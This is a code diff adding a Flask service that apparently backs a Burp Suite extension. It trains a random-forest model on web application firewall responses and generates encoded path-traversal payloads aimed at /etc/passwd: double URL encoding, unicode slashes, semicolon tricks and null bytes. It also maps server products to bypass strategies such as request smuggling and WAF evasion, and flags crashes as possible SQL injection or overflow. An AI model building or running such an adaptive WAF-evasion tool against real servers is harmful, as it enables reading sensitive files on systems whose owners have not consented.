@@ -1,0 +1,119 @@
+from flask import Flask, request, jsonify
+import numpy as np
+import pandas as pd
+from sklearn.ensemble import RandomForestClassifier
+import joblib
+import random
+
+app = Flask(__name__)
+
+# --- GLOBAL STATE ---
+experience_buffer = []
+model = None
+encodings = ["none", "url_double", "unicode", "null_byte", "semicolon_bypass"]
+
+# mapping Server types to known "Weak Points" (From your previous script)
+STRATEGY_MAP = {
+    "varnish": "HTTP_REQUEST_SMUGGLING",
+    "nginx": "PATH_TRAVERSAL_SEMICOLON",
+    "apache": "HTACCESS_BYPASS",
+    "microsoft-iis": "SHORT_FILE_NAME_LEAK",
+    "cloudflare": "WAF_BYPASS_UNICODE"
+}
+
+# --- AI CORE LOGIC ---
+
+def train_agent(data_list):
+    """Trains the Random Forest on WAF Reactions and Latency."""
+    features = []
+    labels = []
+    
+    for item in data_list:
+        # Extract forensics from Java JSON
+        waf_score = float(item.get('waf_reaction_code', 0))
+        latency = np.log1p(float(item.get('latency_ms', 0)))
+        status = float(item.get('status_code', -1))
+        
+        features.append([waf_score, latency, status])
+        
+        # SUCCESS LOGIC: 200 OK is a win, but 341/344 (Confusion) is a "Lead"
+        if item.get('waf_reaction_code') in ['341', '344'] or item.get('status_code') == 200:
+            labels.append(1) 
+        else:
+            labels.append(0)
+
+    clf = RandomForestClassifier(n_estimators=100)
+    clf.fit(features, labels)
+    return clf
+
+# --- ROUTES ---
+
+@app.route('/train', methods=['POST'])
+def handle_training():
+    """Endpoint for the Java Extension to feed the AI new data."""
+    global experience_buffer, model
+    data = request.json
+    
+    if isinstance(data, list):
+        experience_buffer.extend(data)
+    else:
+        experience_buffer.append(data)
+    
+    print(f"[*] Learning from: {data.get('url')} | WAF Code: {data.get('waf_reaction_code')}")
+
+    # Retrain every 10 samples
+    if len(experience_buffer) >= 10:
+        print("[!] Threshold reached. Updating Random Forest Model...")
+        model = train_agent(experience_buffer)
+        joblib.dump(model, 'active_waf_model.pkl')
+        
+    return jsonify({"status": "learning_updated", "buffer_size": len(experience_buffer)})
+
+@app.route('/generate_attack', methods=['GET'])
+def generate_attack():
+    """The AI 'decides' which bypass to try based on previous success."""
+    target_path = "/etc/passwd"
+    
+    # 1. Simple heuristic selection
+    technique = random.choice(encodings)
+    
+    # 2. Payload Construction Logic
+    if technique == "url_double":
+        payload = "%252e%252e%252f" + target_path 
+    elif technique == "unicode":
+        payload = "..%u2215" + target_path
+    elif technique == "semicolon_bypass":
+        payload = "..;/..;/" + target_path
+    elif technique == "null_byte":
+        payload = target_path + "%00.jpg"
+    else:
+        payload = "../../../" + target_path
+
+    return jsonify({
+        "technique": technique,
+        "payload": payload,
+        "strategy_recommendation": "ADAPTIVE_ENCODING"
+    })
+
+@app.route('/analyze_response', methods=['POST'])
+def analyze_response():
+    """High-level analysis of server reactions."""
+    data = request.json
+    status = data.get('status_code')
+    latency = data.get('latency_ms', 0)
+    server = data.get('server_header', 'Unknown')
+    waf_code = data.get('waf_reaction_code', '0')
+
+    # Logical alerts based on your previous version
+    if status == 403:
+        print(f"[!] BLOCKED: {server} (WAF Code: {waf_code})")
+    elif status == 500:
+        print(f"[*] CRASH: {server} might be vulnerable to Buffer Overflow/SQLi")
+    elif status == 200 and latency > 5000:
+        print(f"[+] BYPASS: Time-based vulnerability suspected on {server}")
+
+    return jsonify({"status": "processed"})
+
+if __name__ == '__main__':
+    print("[+] AI Agent Online. Waiting for Burp Telemetry...")
+    app.run(port=5000, debug=True)
